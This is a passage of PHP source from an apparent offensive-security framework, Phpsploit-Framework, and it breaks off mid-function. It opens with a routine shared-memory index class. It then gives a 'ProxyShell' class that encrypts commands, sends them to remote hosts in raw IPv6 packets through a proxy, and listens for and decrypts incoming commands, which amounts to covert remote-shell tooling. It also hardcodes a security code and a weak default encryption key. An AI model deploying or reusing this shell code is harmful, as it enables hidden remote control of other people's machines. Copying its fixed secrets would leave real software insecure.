        $_offset = ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_TYPE + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_TYPE );
        return $_offset;
    }

    public static function get_item_end_flag_offset ()
    {
        $_offset = ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_TYPE + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_TYPE + self::SIZE_BLOCK_INDEXES_ITEM_RESERVED );
        return $_offset;
    }

    public static function get_indexes_item_size ()
    {
        $_size = ( self::SIZE_BLOCK_INDEXES_ITEM );
        return $_size;
    }

    public static function get_indexes_item_block_name_size ()
    {
        $_size = ( self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME );
        return $_size;
    }

    public static function get_indexes_item_block_key_size ()
    {
        $_size = ( self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY );
        return $_size;
    }

    public static function get_indexes_item_content_size_size ()
    {
        $_size = ( self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE );
        return $_size;
    }

    public static function get_indexes_item_block_status_size ()
    {
        $_size = ( self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS );
        return $_size;
    }

    public static function get_indexes_item_block_mode_size ()
    {
        $_size = ( self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE );
        return $_size;
    }

    public static function get_indexes_item_block_type_size ()
    {
        $_size = ( self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_TYPE );
        return $_size;
    }

    public static function get_indexes_item_content_type_size ()
    {
        $_size = ( self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_TYPE );
        return $_size;
    }

    public static function get_indexes_item_reserved_size ()
    {
        $_size = ( self::SIZE_BLOCK_INDEXES_ITEM_RESERVED );
        return $_size;
    }

    public static function get_item_end_flag_size ()
    {
        $_size = ( self::SIZE_BLOCK_INDEXES_ITEM_END_FLAG );
        return $_size;
    }

    public static function indexes_item_string_to_indexes_item_object ( $indexes_item )
    {
        if ( ( ! is_string ( $indexes_item ) ) || ( strlen ( $indexes_item ) != self::SIZE_BLOCK_INDEXES_ITEM ) ) {
            throw new \Exception( "indexes item is error" , 0 );
        }
        $_block_name    = Class_Base_Format::format_name_read ( substr ( $indexes_item , ( self::OFFSET_BLOCK_INDEXES_ITEM_START ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) );
        $_block_key     = Class_Base_Format::format_key_read ( substr ( $indexes_item , ( self::OFFSET_BLOCK_INDEXES_ITEM_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY ) );
        $_content_size  = Class_Base_Format::format_size_read ( substr ( $indexes_item , ( self::OFFSET_BLOCK_INDEXES_ITEM_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY ) , self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE ) );
        $_block_status  = Class_Base_Format::format_status_read ( substr ( $indexes_item , ( self::OFFSET_BLOCK_INDEXES_ITEM_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS ) );
        $_block_mode    = Class_Base_Format::format_mode_read ( substr ( $indexes_item , ( self::OFFSET_BLOCK_INDEXES_ITEM_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE ) );
        $_block_type    = Class_Base_Format::format_type_read ( substr ( $indexes_item , ( self::OFFSET_BLOCK_INDEXES_ITEM_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_TYPE ) );
        $_content_type  = Class_Base_Format::format_type_read ( substr ( $indexes_item , ( self::OFFSET_BLOCK_INDEXES_ITEM_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_TYPE ) , self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_TYPE ) );
        $_reserved      = Class_Base_Format::format_reserved_read ( substr ( $indexes_item , ( self::OFFSET_BLOCK_INDEXES_ITEM_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_TYPE + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_TYPE ) , self::SIZE_BLOCK_INDEXES_ITEM_RESERVED ) );
        $_item_end_flag = Class_Base_Format::format_end_flag_read ( substr ( $indexes_item , ( self::OFFSET_BLOCK_INDEXES_ITEM_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_TYPE + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_TYPE + self::SIZE_BLOCK_INDEXES_ITEM_RESERVED ) , self::SIZE_BLOCK_INDEXES_ITEM_END_FLAG ) );
        $_indexes_item  = new Class_Base_Block_IndexesItem( $_block_name , $_block_key , $_content_size , $_block_status , $_block_mode , $_block_type , $_content_type , $_reserved , $_item_end_flag );
        return $_indexes_item;
    }

    public static function check_block_indexes_item_data ( $indexes_item )
    {
        if ( empty( $indexes_item ) ) {
            return false;
        }
        if ( ! is_string ( $indexes_item ) ) {
            return false;
        }
        if ( strlen ( $indexes_item ) != self::SIZE_BLOCK_INDEXES_ITEM ) {
            return false;
        }
        if ( Class_Base_Format::is_empty ( $indexes_item ) ) {
            return false;
        }
        if ( Class_Base_Format::is_empty ( substr ( $indexes_item , ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY ) ) ) {
            return false;
        }
        if ( Class_Base_Format::is_empty ( substr ( $indexes_item , ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY ) , self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE ) ) ) {
            return false;
        }
        return true;
    }

    public function __construct ( $block_name , $block_key , $content_size , $block_status , $block_mode , $block_type , $content_type , $reserved , $indexes_item_end_flag )
    {
        $this->_block_name    = Class_Base_Format::format_name_write ( $block_name , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME );
        $this->_block_key     = Class_Base_Format::format_key_write ( $block_key );
        $this->_content_size  = Class_Base_Format::format_size_write ( $content_size );
        $this->_block_status  = Class_Base_Format::format_status_write ( $block_status );
        $this->_block_mode    = Class_Base_Format::format_mode_write ( $block_mode );
        $this->_block_type    = Class_Base_Format::format_type_write ( $block_type );
        $this->_content_type  = Class_Base_Format::format_type_write ( $content_type );
        $this->_reserved      = Class_Base_Format::format_reserved_write ( $reserved , self::get_indexes_item_reserved_size () );
        $this->_item_end_flag = Class_Base_Format::format_end_flag_write ( $indexes_item_end_flag , self::SIZE_BLOCK_INDEXES_ITEM_END_FLAG );
    }

    public function __destruct ()
    {
        $this->_block_name    = null;
        $this->_block_key     = null;
        $this->_content_size  = null;
        $this->_block_status  = null;
        $this->_block_mode    = null;
        $this->_block_type    = null;
        $this->_content_type  = null;
        $this->_reserved      = null;
        $this->_item_end_flag = null;
    }

    public function set_block_name ( $block_name )
    {
        $this->_block_name = Class_Base_Format::format_name_write ( $block_name , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME );
    }

    public function set_block_key ( $block_key )
    {
        $this->_block_key = Class_Base_Format::format_key_write ( $block_key );
    }

    public function set_content_size ( $content_size )
    {
        $this->_content_size = Class_Base_Format::format_size_write ( $content_size );
    }

    public function set_block_status ( $block_status )
    {
        $this->_block_status = Class_Base_Format::format_status_write ( $block_status );
    }

    public function set_block_mode ( $block_mode )
    {
        $this->_block_mode = Class_Base_Format::format_mode_write ( $block_mode );
    }

    public function set_block_type ( $block_type )
    {
        $this->_block_type = Class_Base_Format::format_type_write ( $block_type );
    }

    public function set_content_type ( $content_type )
    {
        $this->_content_type = Class_Base_Format::format_type_write ( $content_type );
    }

    public function set_reserved ( $reserved )
    {
        $this->_reserved = Class_Base_Format::format_reserved_write ( $reserved , self::SIZE_BLOCK_INDEXES_ITEM_RESERVED );
    }

    public function set_item_end_flag ( $_item_end_flag )
    {
        $this->_item_end_flag = Class_Base_Format::format_end_flag_write ( $_item_end_flag , self::SIZE_BLOCK_INDEXES_ITEM_END_FLAG );
    }

    public function get_block_name ()
    {
        $_block_name = Class_Base_Format::format_name_read ( $this->_block_name );
        return $_block_name;
    }

    public function get_block_key ()
    {
        $_block_key = Class_Base_Format::format_key_read ( $this->_block_key );
        return $_block_key;
    }

    public function get_content_size ()
    {
        $_content_size = Class_Base_Format::format_size_read ( $this->_content_size );
        return $_content_size;
    }

    public function get_block_status ()
    {
        $_block_status = Class_Base_Format::format_status_read ( $this->_block_status );
        return $_block_status;
    }

    public function get_block_mode ()
    {
        $_block_mode = Class_Base_Format::format_mode_read ( $this->_block_mode );
        return $_block_mode;
    }

    public function get_block_type ()
    {
        $_block_type = Class_Base_Format::format_type_read ( $this->_block_type );
        return $_block_type;
    }

    public function get_content_type ()
    {
        $_content_type = Class_Base_Format::format_type_read ( $this->_content_type );
        return $_content_type;
    }

    public function get_reserved ()
    {
        $_reserved = Class_Base_Format::format_offset_read ( $this->_reserved );
        return $_reserved;
    }

    public function get_item_end_flag ()
    {
        $_item_end_flag = Class_Base_Format::format_end_flag_read ( $this->_item_end_flag );
        return $_item_end_flag;
    }

    public function get_encode_block_name ()
    {
        return $this->_block_name;
    }

    public function get_encode_block_key ()
    {
        return $this->_block_key;
    }

    public function get_encode_content_size ()
    {
        return $this->_content_size;
    }

    public function get_encode_block_status ()
    {
        return $this->_block_status;
    }

    public function get_encode_block_mode ()
    {
        return $this->_block_mode;
    }

    public function get_encode_block_type ()
    {
        return $this->_block_type;
    }

    public function get_encode_content_type ()
    {
        return $this->_content_type;
    }

    public function get_encode_reserved ()
    {
        return $this->_reserved;
    }

    public function get_encode_item_end_flag ()
    {
        return $this->_item_end_flag;
    }

    public function get_block_string ()
    {
        $_block_string = ( $this->_block_name . $this->_block_key . $this->_content_size . $this->_block_status . $this->_block_mode . $this->_block_type . $this->_content_type . $this->_reserved . $this->_item_end_flag );
        return $_block_string;
    }

    public function get_block_string_size ()
    {
        $_block_string        = self::get_block_string ();
        $_block_string_length = strlen ( $_block_string );
        return $_block_string_length;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-1-24
 * Time: 上午11:34
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Operate_ProxyShell extends Class_Root implements Interface_Operate
{
    const SECURITY_CODE                       = "_huc0day_dsafj22892l3832shhj3_";
    const SIZE_SOURCE_IPV6_ADDRESS_SESSION_ID = 64;

    public static function init_session_ipv6_address_info ( $src_ipv6_address = "" , $proxy_ipv6_address = "" , $dst_ipv6_address = "" )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! isset( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_SRC_IPV6" ] ) ) || ( ! is_string ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_SRC_IPV6" ] ) ) ) {
            $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_SRC_IPV6" ] = "";
        }
        if ( ( ! isset( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_PROXY_IPV6" ] ) ) || ( ! is_string ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_PROXY_IPV6" ] ) ) ) {
            $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_PROXY_IPV6" ] = "";
        }
        if ( ( ! isset( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_DST_IPV6" ] ) ) || ( ! is_string ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_DST_IPV6" ] ) ) ) {
            $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_DST_IPV6" ] = "";
        }
        if ( ! empty( $src_ipv6_address ) ) {
            $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_SRC_IPV6" ] = $src_ipv6_address;
        }
        if ( ! empty( $proxy_ipv6_address ) ) {
            $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_PROXY_IPV6" ] = $proxy_ipv6_address;
        }
        if ( ! empty( $dst_ipv6_address ) ) {
            $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_DST_IPV6" ] = $dst_ipv6_address;
        }
    }

    public static function get_session_id ( $ipv6 )
    {
        return self ::get_local_src_to_dst_session_id ( $ipv6 );
    }

    public static function create_session_id ( $src_ipv6 , $dst_ipv6 )
    {
        return self ::create_authentication_code ( $src_ipv6 , $dst_ipv6 );
    }

    public static function get_authentication_code ( $src_ipv6 , $dst_ipv6 )
    {
        return self ::init_authentication_code ( $src_ipv6 , $dst_ipv6 );
    }

    public static function create_authentication_code ( $src_ipv6 , $dst_ipv6 )
    {
        $_shmid_key = self ::get_source_shmid_key ( $src_ipv6 );
        $_shmid     = Class_Base_Memory ::open_share_memory ( $_shmid_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , self::SIZE_SOURCE_IPV6_ADDRESS_SESSION_ID , Class_Base_Memory::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
        if ( empty( $_shmid ) ) {
            $_shmid = Class_Base_Memory ::create_share_memory ( $_shmid_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , self::SIZE_SOURCE_IPV6_ADDRESS_SESSION_ID );
            if ( empty( $_shmid ) ) {
                throw new \Exception( "share memory create is error ( src_ipv6 [ " . $src_ipv6 . " ] , dst_ipv6 [ " . $dst_ipv6 . " ] ) , share memory key ( " . $_shmid_key . " ) , share memory mode ( " . Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE . " ) , share memory size ( " . self::SIZE_SOURCE_IPV6_ADDRESS_SESSION_ID . " ) , share memory flag ( " . Class_Base_Memory::FLAGS_SHARE_MEMORY_CREATE . " ) " , 0 );
            }
        }
        $_authentication_code = self ::create_src_to_dst_session_id_string ( $src_ipv6 , $dst_ipv6 );
        $_write_length        = Class_Base_Memory ::write_share_memory ( $_shmid , $_authentication_code , 0 , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        if ( empty( $_write_length ) ) {
            throw new \Exception( "share memory write is error , key ( " . print_r ( $_shmid_key , true ) . " ) , src ipv6 ( " . print_r ( $src_ipv6 , true ) . " ) , data ( " . print_r ( $_authentication_code , true ) . " ) " );
        }
        return $_authentication_code;
    }

    public static function init_authentication_code ( $src_ipv6 , $dst_ipv6 )
    {
        $_shmid_key = self ::get_source_shmid_key ( $src_ipv6 );
        $_shmid     = self ::get_shmid ( $_shmid_key );
        if ( empty( $_shmid ) ) {
            throw new \Exception( "share memory create is error , key ( " . print_r ( $_shmid_key , true ) . " ) , src ipv6 ( " . print_r ( $src_ipv6 , true ) . " ) " );
        }
        $_authentication_code = Class_Base_Memory ::read_share_memory ( $_shmid , 0 , 32 , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        if ( empty( $_authentication_code ) ) {
            $_authentication_code = self ::create_src_to_dst_session_id_string ( $src_ipv6 , $dst_ipv6 );
            $_write_length        = Class_Base_Memory ::write_share_memory ( $_shmid , $_authentication_code , 0 , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
            if ( empty( $_write_length ) ) {
                throw new \Exception( "share memory write is error , key ( " . print_r ( $_shmid_key , true ) . " ) , src ipv6 ( " . print_r ( $src_ipv6 , true ) . " ) , data ( " . print_r ( $_authentication_code , true ) . " ) " );
            }
            return $_authentication_code;
        }
        $_authentication_code = Class_Base_Format ::data_to_string ( $_authentication_code );
        if ( empty( $_authentication_code ) ) {
            $_authentication_code = self ::create_src_to_dst_session_id_string ( $src_ipv6 , $dst_ipv6 );;
            $_write_length = Class_Base_Memory ::write_share_memory ( $_shmid , $_authentication_code , 0 , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
            if ( empty( $_write_length ) ) {
                throw new \Exception( "share memory write is error , key ( " . print_r ( $_shmid_key , true ) . " ) , src ipv6 ( " . print_r ( $src_ipv6 , true ) . " ) , data ( " . print_r ( $_authentication_code , true ) . " ) " );
            }
            return $_authentication_code;
        }
        return $_authentication_code;
    }

    public static function clear_authentication_code ( $src_ipv6 )
    {
        $_shmid_key = self ::get_source_shmid_key ( $src_ipv6 );
        self ::clear_shmid ( $_shmid_key );
    }

    public static function send ( $src_ipv6 , $dst_ipv6 , $proxy_ipv6 , $command , $encode_key , $encode_iv_base64 , $debug = 0 )
    {
        $_local_ipv6 = Class_Base_RawSocket ::get_local_ipv6_address ();
        if ( empty( $_local_ipv6 ) ) {
            throw new \Exception( "Local global IPV6 address acquisition failed ! " );
        }
        if ( ( empty( $src_ipv6 ) ) || ( ! is_string ( $src_ipv6 ) ) || ( ! Class_Base_Format ::is_ipv6_address ( $src_ipv6 ) ) ) {
            $src_ipv6 = $_local_ipv6;
        }
        if ( ( empty( $proxy_ipv6 ) ) || ( ! is_string ( $proxy_ipv6 ) ) || ( ! Class_Base_Format ::is_ipv6_address ( $proxy_ipv6 ) ) ) {
            $proxy_ipv6 = $_local_ipv6;
        }
        if ( ( empty( $dst_ipv6 ) ) || ( ! is_string ( $dst_ipv6 ) ) || ( ! Class_Base_Format ::is_ipv6_address ( $dst_ipv6 ) ) ) {
            $dst_ipv6 = $_local_ipv6;
        }
        if ( empty( $command ) || ( ! is_string ( $command ) ) || ( strlen ( $command ) <= 0 ) ) {
            $command = "exit";
        }
        $_src_to_dst_session_id = self ::create_session_id ( $src_ipv6 , $dst_ipv6 );
        $_dst_to_src_session_id = self ::create_session_id ( $dst_ipv6 , $src_ipv6 );
        $_data                  = ( $_src_to_dst_session_id . " " . $command );
        $_data                  = Class_Base_Security ::phpsploit_encode ( $_data , $encode_key , base64_decode ( $encode_iv_base64 ) );
        $_send_package          = Class_Base_RawSocket ::create_ipv6_data_package ( $src_ipv6 , $dst_ipv6 , $_data );
        $_packet_size_sent      = Class_Base_RawSocket ::send_ipv6_data_package ( Class_Base_RawSocket::KEY_LOCAL_DOCKER , $_send_package , $proxy_ipv6 );
        return array ( "src_ipv6" => $src_ipv6 , "dst_ipv6" => $dst_ipv6 , "proxy_ipv6" => $proxy_ipv6 , "package_size" => strlen ( $_send_package ) , "src_to_dst_session_id" => $_src_to_dst_session_id , "dst_to_src_session_id" => $_dst_to_src_session_id , "command" => $command , "send_time" => time () , "packet_size_sent" => $_packet_size_sent , "encode_iv" => $encode_key , "encode_iv_base64" => $encode_iv_base64 , "encode_data" => $_data );
    }

    public static function receive ( $encode_key , $encode_iv_base64 , $local_ipv6 = null , $result_show_id = "result_show_id" , $debug = 0 )
    {
        try {
            if ( ( ! empty( $local_ipv6 ) ) && ( is_string ( $local_ipv6 ) ) && ( Class_Base_Format ::is_ipv6_address ( $local_ipv6 ) ) ) {
                $_local_ipv6 = $local_ipv6;
            } else {
                $_local_ipv6 = Class_Base_RawSocket ::get_local_ipv6_address ();
            }
            Class_Base_RawSocket ::get_ipv6_socket ( Class_Base_RawSocket::KEY_LOCAL_DOCKER );
            Class_Base_RawSocket ::select_ipv6_socket ( Class_Base_RawSocket::KEY_LOCAL_DOCKER , 6 );
            while ( true ) {
                Class_Base_RawSocket ::check_browser_service_stop ();
                $_receive_package = Class_Base_RawSocket ::receive_ipv6_data_package ( Class_Base_RawSocket::KEY_LOCAL_DOCKER , $_data , $_local_ipv6 , Class_Base_RawSocket::SIZE_RECEIVE_BYTE_MAX );
                $_src_ipv6        = $_receive_package[ "head_source_address" ];
                $_dst_ipv6        = $_receive_package[ "head_destination_address" ];
                $_encode_data     = $_receive_package[ "data" ];
                $_data            = @Class_Base_Security ::phpsploit_decode ( $_encode_data , $encode_key , base64_decode ( $encode_iv_base64 ) );
                if ( ! is_string ( $_data ) ) {
                    $_data = "";
                }
                if ( ! empty( $debug ) ) {
                    Class_Base_Response ::outputln ( array ( "src_ipv6" => $_src_ipv6 , "dst_ipv6" => $_dst_ipv6 , "encode_key" => $encode_key , "encode_iv_base64" => $encode_iv_base64 , "encode_data" => $_encode_data , "encode_data_size" => strlen ( $_encode_data ) , "data" => $_data , "data_size" => strlen ( $_data ) ) );
                }
                if ( $_dst_ipv6 == $_local_ipv6 ) {
                    $_data_length = strlen ( $_data );
                    if ( $_data_length < 32 ) {
                        if ( ! is_cli () ) {
                            Class_Base_Response ::output_textarea_inner_html ( $result_show_id , ( "\n" . ( $_src_ipv6 . " is authentication failed , time : " . date ( "Y-m-d H:i:s" , time () ) ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                        } else {
                            Class_Base_Response ::outputln ( "\n" . ( $_src_ipv6 . " is authentication failed in data length ( " . $_data_length . " )  , time : " . date ( "Y-m-d H:i:s" , time () ) ) . "\n" );
                        }
                    } else {
                        $_src_to_dst_session_id = Class_Base_Format ::data_to_string ( substr ( $_data , 0 , 32 ) );
                        if ( empty( $_src_to_dst_session_id ) ) {
                            if ( ! is_cli () ) {
                                Class_Base_Response ::output_textarea_inner_html ( $result_show_id , ( "\n" . ( $_src_ipv6 . " is authentication failed , time : " . date ( "Y-m-d H:i:s" , time () ) ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                            } else {
                                Class_Base_Response ::outputln ( "\n" . ( $_src_ipv6 . " is authentication failed in src_to_dst_session_id ( " . print_r ( $_src_to_dst_session_id , true ) . " ) , time : " . date ( "Y-m-d H:i:s" , time () ) ) . "\n" );
                            }
                        } else {
                            $_local_src_to_dst_session_id = self ::create_session_id ( $_src_ipv6 , $_dst_ipv6 );
                            if ( $_local_src_to_dst_session_id == $_src_to_dst_session_id ) {
                                $_chr32_position = strpos ( $_data , chr ( 32 ) );
                                if ( ( $_chr32_position == 32 ) && ( $_data_length > 33 ) ) {
                                    $_content = Class_Base_Format ::data_to_string ( substr ( $_data , 33 , ( $_data_length - 33 ) ) );
                                    if ( ! is_cli () ) {
                                        Class_Base_Response ::output_textarea_inner_html ( $result_show_id , ( "\n" . ( "receive form " . $_src_ipv6 . " to " . $_dst_ipv6 . " , src_to_dst_session_id ( " . $_src_to_dst_session_id . " ) , content ( " . $_content . " ) " ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                                    } else {
                                        Class_Base_Response ::outputln ( "\n" . ( "receive form " . $_src_ipv6 . " to " . $_dst_ipv6 . " , src_to_dst_session_id ( " . $_src_to_dst_session_id . " ) , package size : " . $_receive_package[ "package_size" ] . " , content ( " . $_content . " ) " ) . "\n" );
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } catch ( \Exception $e ) {
            Class_Base_RawSocket ::clear_ipv6_socket ( Class_Base_RawSocket::KEY_LOCAL_DOCKER );
            if ( ! is_cli () ) {
                Class_Base_Response ::output_textarea_inner_html ( $result_show_id , ( "\n" . ( print_r ( $e , true ) ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response ::outputln ( "\n" . ( print_r ( $e , true ) ) . "\n" );
            }
        }
    }

    public static function listen ( $local_ipv6 = null , $result_show_id = "result_show_id" , $debug = 0 )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        $_encode_key       = ( empty( $_SESSION[ "SOCKET_PROXY_SHELL_ENCODE_KEY" ] ) ? ( $_SESSION[ "SOCKET_PROXY_SHELL_ENCODE_KEY" ] = "1234567890123456890123456789012" ) : ( $_SESSION[ "SOCKET_PROXY_SHELL_ENCODE_KEY" ] ) );
        $_encode_iv_base64 = ( empty( $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] ) ? ( $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] = base64_encode ( openssl_random_pseudo_bytes ( openssl_cipher_iv_length ( "AES-256-CBC" ) ) ) ) : ( $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] ) );
        //$_encode_key       = ( empty( $_SESSION[ "SOCKET_PROXY_SHELL_ENCODE_KEY" ] ) ? ( $_SESSION[ "SOCKET_PROXY_SHELL_ENCODE_KEY" ] = md5 ( time () . rand ( 10000000 , 99999999 ) ) ) : ( $_SESSION[ "SOCKET_PROXY_SHELL_ENCODE_KEY" ] ) );
        //$_encode_iv_base64 = ( empty( $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] ) ? ( $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] = base64_encode ( "1234567890123456890123456789012" ) ) : ( $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] ) );

        Class_Base_Response ::outputln ( "" );
        Class_Base_Response ::outputln ( "encode_key : " . $_encode_key );
        Class_Base_Response ::outputln ( "encode_iv_base64 : " . $_encode_iv_base64 );
        Class_Base_Response ::outputln ( "" );

        try {
            if ( ( ! empty( $local_ipv6 ) ) && ( is_string ( $local_ipv6 ) ) && ( Class_Base_Format ::is_ipv6_address ( $local_ipv6 ) ) ) {
                $_local_ipv6 = $local_ipv6;
            } else {
                $_local_ipv6 = Class_Base_RawSocket ::get_local_ipv6_address ();
            }
            Class_Base_RawSocket ::get_ipv6_socket ( Class_Base_RawSocket::KEY_LOCAL_DOCKER );
            Class_Base_RawSocket ::select_ipv6_socket ( Class_Base_RawSocket::KEY_LOCAL_DOCKER , 6 );
            while ( true ) {
                Class_Base_RawSocket ::check_browser_service_stop ();
                $_receive_package       = Class_Base_RawSocket ::receive_ipv6_data_package ( Class_Base_RawSocket::KEY_LOCAL_DOCKER , $_data , $_local_ipv6 , Class_Base_RawSocket::SIZE_RECEIVE_BYTE_MAX );
                $_src_ipv6              = $_receive_package[ "head_source_address" ];
                $_dst_ipv6              = $_receive_package[ "head_destination_address" ];
                $_data                  = $_receive_package[ "data" ];
                $_data                  = Class_Base_Security ::phpsploit_decode ( $_data , $_encode_key , base64_decode ( $_encode_iv_base64 ) );
                $_src_to_dst_session_id = self ::get_local_src_to_dst_session_id ( $_src_ipv6 );
                if ( empty( $_src_to_dst_session_id ) ) {
